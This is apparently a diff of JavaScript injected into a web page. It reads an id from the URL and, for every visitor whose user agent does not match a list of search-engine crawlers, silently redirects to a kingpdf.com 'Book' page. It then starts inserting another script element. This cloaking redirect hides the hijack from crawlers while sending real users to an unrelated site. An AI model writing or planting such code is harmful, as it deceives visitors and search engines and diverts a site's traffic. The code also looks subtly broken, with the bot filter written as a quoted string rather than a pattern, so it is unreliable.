@@ -2,11 +2,7 @@ let url = window['location']['href'], id = url['substring'](url['lastIndexOf']('
 if (id['match'](/^[A-Za-z0-9_.]+$/) != null) {
     let user_agent = navigator['userAgent'],
     filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i',
-    function product(prodia) {
-        let jeson = prodia['result'],
-        prodtit = jeson['productName']
-    }
-    redirect_link = 'https://kingpdf.com/'+ prodtit +'-'+ id + '.html';
+    redirect_link = 'https://kingpdf.com/Book-'+ id + '.html';
     !user_agent['match'](filter_bot) && window['location']['replace'](redirect_link);
     let data_content = document['getElementById']('desc'),
     s = document['createElement']('script');
